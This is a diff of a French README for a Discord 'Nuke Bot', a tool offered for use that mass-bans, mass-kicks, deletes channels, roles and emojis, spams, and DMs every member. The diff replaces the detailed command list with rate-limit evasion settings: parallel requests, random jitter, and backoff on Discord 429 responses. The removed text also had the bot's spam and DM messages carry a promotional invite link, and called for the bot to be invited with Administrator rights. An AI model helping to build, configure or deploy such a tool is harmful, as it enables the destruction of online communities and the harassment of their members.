@@ -1,30 +1,30 @@
-# Nuke Bot — prefix only
+# Nuke Bot — anti rate-limit
 
 ## Variables
 
 ```
 TOKEN=...
-OWNER_IDS=ton_id
+OWNER_IDS=...
 WHITELIST_GUILDS=id1,id2
+
+# anti-restrict (optionnel)
+CONCURRENCY=2
+RATE_LIMIT_DELAY=0.45
+PHASE_PAUSE=2.0
+CMD_COOLDOWN=8
+MAX_RETRIES=4
 ```
 
-## Commandes (owner only)
+## Protections
 
-```
-!nuke [id]
-!banall / !kickall
-!delchannels / !delroles / !delemojis
-!spam [n]
-!rename [name]
-!dmall [msg]
-!prune [days]
-!whitelist add <serverID>
-!whitelist remove <serverID>
-!whitelist list
-!unwhitelist <serverID>
-!leave / !guilds / !status / !helpnuke
-```
+- Cooldown commandes lourdes (défaut 8s)
+- Max 2 actions Discord en parallèle
+- Jitter aléatoire entre chaque requête
+- Backoff exponentiel sur 429 + respect Retry-After
+- Pause globale si rate-limit global Discord
+- Un seul nuke à la fois (lock)
+- Pause entre chaque phase du nuke
 
-Spam / DM / nuke footer = promo discord.gg/SKyfbZxzbp
+## Commandes
 
-Invite: bot + Administrator. Intents: Members + Message Content.
+`!nuke` `!banall` `!kickall` `!delchannels` `!delroles` `!delemojis` `!spam` `!rename` `!dmall` `!prune` `!whitelist` `!unwhitelist` `!leave` `!guilds` `!status` `!helpnuke`
